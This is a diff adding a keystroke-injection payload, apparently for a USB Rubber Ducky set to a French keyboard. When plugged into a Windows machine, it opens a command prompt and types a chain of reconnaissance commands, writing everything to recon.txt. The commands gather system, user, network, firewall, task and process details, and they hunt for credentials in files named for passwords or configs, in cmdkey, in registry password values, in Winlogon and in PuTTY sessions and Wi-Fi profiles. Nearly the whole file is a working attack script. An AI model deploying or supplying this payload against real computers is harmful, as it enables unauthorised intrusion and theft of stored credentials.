@@ -1,0 +1,82 @@
+LOCALE FR
+DELAY 2000
+GUI r
+DELAY 1000
+DELETE
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING systeminfo > recon.txt
+DELAY 500
+ENTER
+DELAY 3000
+STRING net users >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING ipconfig /all >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING arp -a >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING netsh advfirewall show allprofiles state >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING netsh advfirewall firewall show rule name=all >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING schtasks /query /fo LIST /v >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING tasklist /SVC >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING dir /s *pass* == *cred* == *.config* == *.xml* >> recon.txt
+DELAY 500
+ENTER
+DELAY 5000
+STRING dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.ncnf >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING cmdkey /list >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING reg query HKCU /f password /t REG_SZ /s >> recon.txt
+DELAY 500
+ENTER
+DELAY 3000
+STRING reg query HKLM /f password /t REG_SZ /s >> recon.txt
+DELAY 500
+ENTER
+DELAY 3000
+STRING reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING netsh wlan show profile >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING set >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+
